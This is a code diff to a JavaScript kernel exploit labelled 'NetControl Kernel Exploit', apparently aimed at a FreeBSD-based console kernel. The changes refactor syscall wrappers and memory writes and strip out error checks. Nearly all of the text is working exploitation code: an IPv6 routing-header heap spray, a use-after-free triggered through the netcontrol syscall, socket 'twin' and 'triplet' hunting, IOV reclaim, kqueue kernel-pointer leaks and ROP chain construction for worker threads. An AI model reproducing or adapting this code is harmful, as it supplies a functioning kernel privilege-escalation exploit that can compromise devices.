@@ -1,6 +1,5 @@
 include('inject.js')
-include('defs.js')
-include('types.js')
+
 
 
 
@@ -9,6 +8,28 @@ include('types.js')
 // NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
 // ============================================================================
 utils.notify('ð\x9F\x92\xA9 NetControl ð\x9F\x92\xA9')
+
+// Socket constants (FreeBSD)
+var AF_UNIX = 1
+var AF_INET6 = 28
+var SOCK_STREAM = 1
+var IPPROTO_IPV6 = 41
+
+// IPv6 socket option constants
+var IPV6_RTHDR = 51
+var IPV6_RTHDR_TYPE_0 = 0
+
+// Spray parameters
+var UCRED_SIZE = 0x168
+var MSG_HDR_SIZE = 0x30
+var IOV_SIZE = 0x10
+var MSG_IOV_NUM = 0x17
+var IPV6_SOCK_NUM = 64  // Match Java: 64 sockets, not 128
+var RTHDR_TAG = 0x13370000
+
+// Retry parameters
+var TWIN_TRIES = 15000
+var UAF_TRIES = 50000
 
 // NetControl constants
 var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
@@ -47,19 +68,33 @@ if (missing.length > 0) {
 
 log('=== NetControl ===')
 
-// Create syscall wrappers using fn.create()
-var socket = fn.create(0x61, ['bigint', 'bigint', 'bigint'], 'bigint')
-var socketpair = fn.create(0x87, ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
-var setsockopt = fn.create(0x69, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
-var getsockopt = fn.create(0x76, ['bigint', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
-var close_sys = fn.create(0x06, ['bigint'], 'bigint')
-var dup_sys = fn.create(0x29, ['bigint'], 'bigint')
-var recvmsg = fn.create(0x1B, ['bigint', 'bigint', 'bigint'], 'bigint')
-var netcontrol_sys = fn.create(0x63, ['int', 'int', 'bigint', 'int'], 'bigint')
-var read_sys = fn.create(0x03, ['bigint', 'bigint', 'bigint'], 'bigint')
-var write_sys = fn.create(0x04, ['bigint', 'bigint', 'bigint'], 'bigint')
-var setuid_sys = fn.create(0x17, ['int'], 'bigint')
-var sched_yield = fn.create(0x14B, [], 'bigint')
+// Register syscall wrappers using fn.register()
+fn.register(0x61, 'socket', 'bigint')
+fn.register(0x87, 'socketpair', 'bigint')
+fn.register(0x69, 'setsockopt', 'bigint')
+fn.register(0x76, 'getsockopt', 'bigint')
+fn.register(0x06, 'close_sys', 'bigint')
+fn.register(0x29, 'dup_sys', 'bigint')
+fn.register(0x1B, 'recvmsg', 'bigint')
+fn.register(0x63, 'netcontrol_sys', 'bigint')
+fn.register(0x03, 'read_sys', 'bigint')
+fn.register(0x04, 'write_sys', 'bigint')
+fn.register(0x17, 'setuid_sys', 'bigint')
+fn.register(0x14B, 'sched_yield', 'bigint')
+
+// Create shorthand references
+var socket = fn.socket
+var socketpair = fn.socketpair
+var setsockopt = fn.setsockopt
+var getsockopt = fn.getsockopt
+var close_sys = fn.close_sys
+var dup_sys = fn.dup_sys
+var recvmsg = fn.recvmsg
+var netcontrol_sys = fn.netcontrol_sys
+var read_sys = fn.read_sys
+var write_sys = fn.write_sys
+var setuid_sys = fn.setuid_sys
+var sched_yield = fn.sched_yield
 
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper = syscalls.map.get(0x03)
@@ -69,25 +104,10 @@ var recvmsg_wrapper = syscalls.map.get(0x1B)
 // Threading using scePthreadCreate
 // int32_t scePthreadCreate(OrbisPthread *, const OrbisPthreadAttr *, void*(*F)(void*), void *, const char *)
 var scePthreadCreate_addr = libc_addr.add(new BigInt(0, 0x340))
-var scePthreadCreate = fn.create(scePthreadCreate_addr, ['bigint', 'bigint', 'bigint', 'bigint', 'string'], 'bigint')
+fn.register(scePthreadCreate_addr, 'scePthreadCreate', 'bigint')
+var scePthreadCreate = fn.scePthreadCreate
 
 log('Using scePthreadCreate at: ' + scePthreadCreate_addr.toString())
-
-// Define thr_param structure
-var ThrParam = struct.create('ThrParam', [
-  { type: 'Uint64*', name: 'start_func' },
-  { type: 'Uint64*', name: 'arg' },
-  { type: 'Uint64*', name: 'stack_base' },
-  { type: 'Uint64', name: 'stack_size' },
-  { type: 'Uint64*', name: 'tls_base' },
-  { type: 'Uint64', name: 'tls_size' },
-  { type: 'Uint64*', name: 'child_tid' },
-  { type: 'Uint64*', name: 'parent_tid' },
-  { type: 'Int32', name: 'flags' },
-  { type: 'Uint64*', name: 'rtp' }
-])
-
-log('ThrParam struct size: ' + ThrParam.sizeof)
 
 // Pre-allocate all buffers once (reuse throughout exploit)
 var store_addr = mem.malloc(0x100)
@@ -104,15 +124,12 @@ var socket_count = 0
 log('Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')
 
 // Create IPv6 sockets using socket()
+// Note: socket() auto-throws on error in new API, no need for manual checks
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
   var fd = socket(AF_INET6, SOCK_STREAM, 0)
 
-  if (fd === -1) {
-    log('ERROR: socket() failed at index ' + i)
-    break
-  }
-
-  ipv6_sockets[i] = fd
+  // Store as number in Int32Array (fn.register returns BigInt)
+  ipv6_sockets[i] = fd.lo()
   socket_count++
 }
 
@@ -126,21 +143,12 @@ if (socket_count !== IPV6_SOCK_NUM) {
 log('Initializing pktopts on all sockets...')
 
 // Initialize pktopts by calling setsockopt with NULL buffer
-var init_count = 0
+// Note: setsockopt() auto-throws on error, so all calls that don't throw succeeded
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-  var ret = setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
-
-  if (ret !== -1) {
-    init_count++
-  }
+  setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 }
 
-log('Initialized ' + init_count + ' pktopts')
-
-if (init_count === 0) {
-  log('FAILED: No pktopts initialized')
-  throw new Error('Failed to initialize pktopts')
-}
+log('Initialized ' + IPV6_SOCK_NUM + ' pktopts')
 
 // ============================================================================
 // STAGE 2: Spray routing headers
@@ -149,10 +157,10 @@ if (init_count === 0) {
 // Build IPv6 routing header template
 // Header structure: ip6r_nxt (1 byte), ip6r_len (1 byte), ip6r_type (1 byte), ip6r_segleft (1 byte)
 var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
-mem.write1(rthdr_buf, 0) // ip6r_nxt
-mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len) // ip6r_len
-mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0) // ip6r_type
-mem.write1(rthdr_buf.add(new BigInt(0, 3)), rthdr_len >> 1) // ip6r_segleft
+mem.view(rthdr_buf).setUint8(0, 0) // ip6r_nxt
+mem.view(rthdr_buf).setUint8(1, rthdr_len) // ip6r_len
+mem.view(rthdr_buf).setUint8(2, IPV6_RTHDR_TYPE_0) // ip6r_type
+mem.view(rthdr_buf).setUint8(3, rthdr_len >> 1) // ip6r_segleft
 var rthdr_size = (rthdr_len + 1) << 3
 
 log('Built routing header template (size=' + rthdr_size + ' bytes)')
@@ -162,7 +170,7 @@ log('Spraying routing headers across ' + IPV6_SOCK_NUM + ' sockets...')
 
 for (var i = 0; i < IPV6_SOCK_NUM; i++) {
   // Write unique tag at offset 0x04 (RTHDR_TAG | socket_index)
-  mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
+  mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
 
   // Call setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
   setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
@@ -186,7 +194,7 @@ var twins = [-1, -1]
 var triplets = [-1, -1, -1]
 var uaf_sock = -1
 
-// Try socketpair using fn.create() approach
+// Try socketpair using fn.register() approach
 log('Attempting socketpair...')
 
 var sp_buf = mem.malloc(8)
@@ -194,18 +202,9 @@ log('Allocated socketpair buffer at: ' + sp_buf.toString())
 
 socketpair(1, 1, 0, sp_buf)
 
-var iov_ss0 = mem.read4(sp_buf).lo() & 0xFFFFFFFF
-var iov_ss1 = mem.read4(sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF
-
-if (iov_ss0 === 0xFFFFFFFF || iov_ss1 === 0xFFFFFFFF) {
-  var errno_val = _error()
-  var errno_int = mem.read4(errno_val)
-  var errno_str = strerror(errno_int)
-  log('ERROR: socketpair failed')
-  log('  errno: ' + errno_int + ' (' + errno_str + ')')
-  log('  fds: [' + iov_ss0 + ', ' + iov_ss1 + ']')
-  throw new Error('socketpair failed with errno ' + errno_int)
-}
+// Extract FD values from buffer (syscalls auto-throw on error)
+var iov_ss0 = mem.view(sp_buf).getUint32(0, true)
+var iov_ss1 = mem.view(sp_buf).getUint32(4, true)
 
 log('Created socketpair: [' + iov_ss0 + ', ' + iov_ss1 + ']')
 
@@ -214,35 +213,35 @@ var iov_recv_buf = mem.malloc(MSG_IOV_NUM * 8)  // Valid buffer for receiving
 var msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
 for (var i = 0; i < MSG_IOV_NUM; i++) {
   // Point to valid buffer (kernel will allocate IOV structures with iov_base pointing here)
-  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE)), iov_recv_buf.add(new BigInt(0, i * 8)))
-  mem.write8(msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
+  mem.view(msg_iov).setBigInt(i * IOV_SIZE, iov_recv_buf.add(new BigInt(0, i * 8)), true)
+  mem.view(msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 8), true)
 }
 
 // Prepare msg_hdr for recvmsg
 var msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.write8(msg_hdr.add(new BigInt(0, 0x00)), BigInt.Zero)  // msg_name
-mem.write4(msg_hdr.add(new BigInt(0, 0x08)), 0)             // msg_namelen
-mem.write8(msg_hdr.add(new BigInt(0, 0x10)), msg_iov)       // msg_iov
-mem.write4(msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)   // msg_iovlen
-mem.write8(msg_hdr.add(new BigInt(0, 0x20)), BigInt.Zero)   // msg_control
-mem.write4(msg_hdr.add(new BigInt(0, 0x28)), 0)             // msg_controllen
-mem.write4(msg_hdr.add(new BigInt(0, 0x2C)), 0)             // msg_flags
+mem.view(msg_hdr).setBigInt(0x00, BigInt.Zero, true)  // msg_name
+mem.view(msg_hdr).setUint32(0x08, 0, true)             // msg_namelen
+mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)       // msg_iov
+mem.view(msg_hdr).setUint32(0x18, MSG_IOV_NUM, true)   // msg_iovlen
+mem.view(msg_hdr).setBigInt(0x20, BigInt.Zero, true)   // msg_control
+mem.view(msg_hdr).setUint32(0x28, 0, true)             // msg_controllen
+mem.view(msg_hdr).setUint32(0x2C, 0, true)             // msg_flags
 
 // Prepare IOV for kernel corruption (will modify iov_base to 1 later)
 var corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
 for (var i = 0; i < MSG_IOV_NUM; i++) {
-  mem.write8(corrupt_msg_iov.add(new BigInt(0, i * IOV_SIZE)), new BigInt(0, 1))  // iov_base = 1
-  mem.write8(corrupt_msg_iov.add(new BigInt(0, i * IOV_SIZE + 8)), new BigInt(0, 8))
+  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE, new BigInt(0, 1), true)  // iov_base = 1
+  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 8), true)
 }
 
 var corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x00)), BigInt.Zero)
-mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x08)), 0)
-mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x10)), corrupt_msg_iov)
-mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x18)), MSG_IOV_NUM)
-mem.write8(corrupt_msg_hdr.add(new BigInt(0, 0x20)), BigInt.Zero)
-mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x28)), 0)
-mem.write4(corrupt_msg_hdr.add(new BigInt(0, 0x2C)), 0)
+mem.view(corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)
+mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)
+mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)
+mem.view(corrupt_msg_hdr).setUint32(0x18, MSG_IOV_NUM, true)
+mem.view(corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)
+mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)
+mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)
 
 log('Prepared IOV spray structures')
 
@@ -255,7 +254,8 @@ var recvmsg_wrapper = syscalls.map.get(0x1B)
 var read_wrapper = syscalls.map.get(0x03)
 var write_wrapper = syscalls.map.get(0x04)
 var thr_exit_wrapper = syscalls.map.get(0x1AF)
-var thr_new = fn.create(0x1C7, ['bigint', 'bigint'], 'bigint')
+fn.register(0x1C7, 'thr_new', 'bigint')
+var thr_new = fn.thr_new
 
 // Worker pool - each worker has its own resources
 var workers = []
@@ -265,8 +265,8 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
   // Control socketpair for signaling this worker
   var ctrl_sp_buf = mem.malloc(8)
   socketpair(1, 1, 0, ctrl_sp_buf)
-  worker.ctrl_sock0 = mem.read4(ctrl_sp_buf).lo() & 0xFFFFFFFF
-  worker.ctrl_sock1 = mem.read4(ctrl_sp_buf.add(new BigInt(0, 4))).lo() & 0xFFFFFFFF
+  worker.ctrl_sock0 = mem.view(ctrl_sp_buf).getUint32(0, true)
+  worker.ctrl_sock1 = mem.view(ctrl_sp_buf).getUint32(4, true)
 
   // Worker resources
   worker.stack_size = 0x1000
@@ -326,26 +326,26 @@ function spawnWorker(worker_idx) {
   var worker = workers[worker_idx]
 
   // Reset TID values
-  mem.write8(worker.child_tid, BigInt.Zero)
-  mem.write8(worker.parent_tid, BigInt.Zero)
+  mem.view(worker.child_tid).setBigInt(0, BigInt.Zero, true)
+  mem.view(worker.parent_tid).setBigInt(0, BigInt.Zero, true)
 
   // Build and write ROP chain to stack
   var rop = buildWorkerROP(worker)
   var stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
   for (var i = rop.length - 1; i >= 0; i--) {
     stack_top = stack_top.sub(new BigInt(0, 8))
-    mem.write8(stack_top, rop[i])
+    mem.view(stack_top).setBigInt(0, rop[i], true)
   }
 
   // Setup thr_param
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x00)), gadgets.RET)
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x08)), BigInt.Zero)
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x10)), worker.stack)
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x18)), new BigInt(0, worker.stack_size))
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x20)), worker.tls)
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x28)), new BigInt(0, 0x40))
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x30)), worker.child_tid)
-  mem.write8(worker.thr_param.add(new BigInt(0, 0x38)), worker.parent_tid)
+  mem.view(worker.thr_param).setBigInt(0x00, gadgets.RET, true)
+  mem.view(worker.thr_param).setBigInt(0x08, BigInt.Zero, true)
+  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
+  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
+  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
+  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
+  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
+  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)
 
   return thr_new(worker.thr_param, new BigInt(0, 0x68))
 }
@@ -397,7 +397,7 @@ log('Created dummy socket: ' + dummy_sock)
 
 // Register dummy socket with netcontrol
 var set_buf = mem.malloc(8)
-mem.write4(set_buf, dummy_sock)
+mem.view(set_buf).setUint32(0, dummy_sock, true)
 netcontrol_sys(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8)
 log('Registered dummy socket')
 
@@ -417,7 +417,7 @@ setuid_sys(1)
 
 // Unregister and free the file and ucred
 var clear_buf = mem.malloc(8)
-mem.write4(clear_buf, uaf_sock)
+mem.view(clear_buf).setUint32(0, uaf_sock, true)
 netcontrol_sys(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8)
 log('Unregistered uaf_sock')
 
@@ -445,30 +445,18 @@ var found_twins = false
 var twin_attempts = 0
 
 while (!found_twins) {
-  // Clear all routing headers every 10 attempts to avoid OOM
-  if (twin_attempts > 0 && twin_attempts % 10 === 0) {
-    log('Clearing all routing headers to prevent OOM (attempt ' + twin_attempts + ')...')
-    for (var clear_i = 0; clear_i < IPV6_SOCK_NUM; clear_i++) {
-      setsockopt(ipv6_sockets[clear_i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
-    }
-    // Give kernel time to free memory (200 yields)
-    for (var clear_delay = 0; clear_delay < 200; clear_delay++) { sched_yield() }
-    gc()
-    log('Cleared all routing headers (200 yields + GC), continuing twin search...')
-  }
-
-  // Spray tags across all sockets
+  // Spray tags across all sockets (matching Java findTwins)
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
+    mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
     setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
   }
 
   // Check for twins
   for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    mem.write8(leak_len_buf, new BigInt(0, 8))  // Read only 8 bytes
+    mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 8), true)  // Read only 8 bytes
     getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
-    var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
+    var val = mem.view(leak_rthdr_buf).getUint32(4, true)
     var j = val & 0xFFFF
 
     if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
@@ -477,11 +465,6 @@ while (!found_twins) {
       found_twins = true
       log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr (attempt ' + (twin_attempts + 1) + ')')
       break
-    }
-
-    // Debug: show first few attempts
-    if (twin_attempts < 3 && i < 3) {
-      log('  attempt=' + twin_attempts + ' sock[' + i + '] val=0x' + val.toString(16) + ' j=' + j)
     }
   }
 
@@ -521,10 +504,10 @@ while (triplet_spray_attempts < max_triplet_spray) {
   gc()
 
   // Check if reclaim succeeded (after batch)
-  mem.write8(leak_len_buf, new BigInt(0, 8))
+  mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 8), true)
   getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
-  var first_int = mem.read4(leak_rthdr_buf)
+  var first_int = mem.view(leak_rthdr_buf).getUint32(0, true)
   if (first_int === 1) {
     log('IOV reclaim successful after ' + triplet_spray_attempts + ' sprays (first_int = 1)')
     break
@@ -558,7 +541,7 @@ function findTriplet (master, other) {
       if (i === master || i === other) {
         continue
       }
-      mem.write4(rthdr_buf.add(new BigInt(0, 4)), RTHDR_TAG | i)
+      mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
       setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
     }
 
@@ -568,10 +551,10 @@ function findTriplet (master, other) {
         continue
       }
 
-      mem.write8(leak_len_buf, new BigInt(0, UCRED_SIZE))
+      mem.view(leak_len_buf).setBigInt(0, new BigInt(0, UCRED_SIZE), true)
       getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
-      var val = mem.read4(leak_rthdr_buf.add(new BigInt(0, 4)))
+      var val = mem.view(leak_rthdr_buf).getUint32(4, true)
       var j = val & 0xFFFF
 
       if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
@@ -580,9 +563,6 @@ function findTriplet (master, other) {
     }
 
     attempt++
-    if (attempt % 1000 === 0) {
-      log('findTriplet attempt ' + attempt + '...')
-    }
   }
 
   return -1
@@ -618,7 +598,8 @@ setsockopt(ipv6_sockets[triplets[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
 log('Freed rthdr on socket[' + triplets[1] + ']')
 
 // Get kqueue syscall (0x16A = 362)
-var kqueue_sys = fn.create(0x16A, [], 'int')
+fn.register(0x16A, 'kqueue_sys', 'bigint')
+var kqueue_sys = fn.kqueue_sys
 
 // Loop until we reclaim with kqueue structure
 var kq_fd = -1
@@ -626,21 +607,18 @@ var kq_fdp = BigInt.Zero
 var max_attempts = 100
 
 for (var attempt = 0; attempt < max_attempts; attempt++) {
-  // Create kqueue
+  // Create kqueue (auto-throws on error)
   kq_fd = kqueue_sys()
-  if (kq_fd < 0) {
-    throw new Error('kqueue() failed')
-  }
 
   // Leak with triplets[0]
-  mem.write8(leak_len_buf, new BigInt(0, 0x100))
+  mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 0x100), true)
   getsockopt(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
   // Check for kqueue signature at offset 0x08
-  var sig = mem.read4(leak_rthdr_buf.add(new BigInt(0, 0x08)))
+  var sig = mem.view(leak_rthdr_buf).getUint32(0x08, true)
   if (sig === 0x1430000) {
     // Found kqueue! Extract kq_fdp at offset 0xA8
-    kq_fdp = mem.read8(leak_rthdr_buf.add(new BigInt(0, 0xA8)))
+    kq_fdp = mem.view(leak_rthdr_buf).getBigInt(0xA8, true)
     log('Found kqueue structure after ' + (attempt + 1) + ' attempts')
     log('kq_fdp: ' + kq_fdp.toString())
     break
